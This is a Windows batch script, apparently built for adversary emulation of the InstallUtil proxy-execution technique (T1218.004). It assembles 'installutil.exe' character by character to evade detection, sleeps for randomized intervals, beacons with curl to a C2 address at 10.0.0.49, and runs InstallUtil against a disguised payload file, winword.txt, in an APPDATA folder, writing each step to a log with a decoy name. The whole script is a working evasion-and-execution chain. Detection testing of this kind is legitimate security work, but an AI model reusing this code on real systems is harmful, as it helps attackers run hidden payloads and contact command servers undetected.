@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8523\fb38d123
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8523-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=winword.txt
SET dvhhyc=8523

REM Derived paths
SET ghtd=!APPDATA!\!rrocubc!
SET phdvc=%ghtd%\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=begin>> "%phdvc%" 2>nul

REM Initial delay (random 30-60s)
SET /A hhkz=%RANDOM% %% 30 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay=!hhkz!s>> "%phdvc%" 2>nul
timeout /t !hhkz! /nobreak >nul

REM Character-by-character LOLBIN assembly
SET c1=i
SET c2=n
SET c3=s
SET c4=t
SET c5=a
SET c6=l
SET c7=l
SET c8=u
SET c9=t
SET c10=i
SET c11=l
SET jssnm=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%.exe

REM Delayed before heartbeat
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: pre_heartbeat_delay=begin>> "%phdvc%" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: pre_heartbeat_delay=complete>> "%phdvc%" 2>nul

REM C2 Heartbeat
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat=begin>> "%phdvc%" 2>nul
curl -k -s -o nul "!keghkgto!"
SET bnqw=1
IF ERRORLEVEL 1 SET bnqw=0
IF !bnqw! EQU 1 (SET lfft=) ELSE (SET lfft=connection_failed)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218.004|InstallUtil=!bnqw!::!lfft!>> "%phdvc%" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat=!bnqw!>> "%phdvc%" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul

REM Change directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change=begin>> "%phdvc%" 2>nul
cd /d "!txisnba!"
SET xnkg=1
IF ERRORLEVEL 1 SET xnkg=0
IF !xnkg! EQU 1 (SET mjhz=) ELSE (SET mjhz=path_not_found)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change=!xnkg!>> "%phdvc%" 2>nul

REM Random delay
SET /A ccew=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay=!ccew!s>> "%phdvc%" 2>nul
timeout /t !ccew! /nobreak >nul

REM Execute InstallUtil
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: dll_execution=begin>> "%phdvc%" 2>nul
%jssnm% /logfile= /LogToConsole=false /U "!xzanpex!"
SET dqea=1
IF ERRORLEVEL 1 SET dqea=0
IF !dqea! EQU 1 (SET txqd=) ELSE (SET txqd=execution_failed)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218.004|InstallUtil=!dqea!::!txqd!>> "%phdvc%" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: dll_execution=!dqea!>> "%phdvc%" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay=begin>> "%phdvc%" 2>nul
ping -n 6 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay=complete>> "%phdvc%" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_end=complete>> "%phdvc%" 2>nul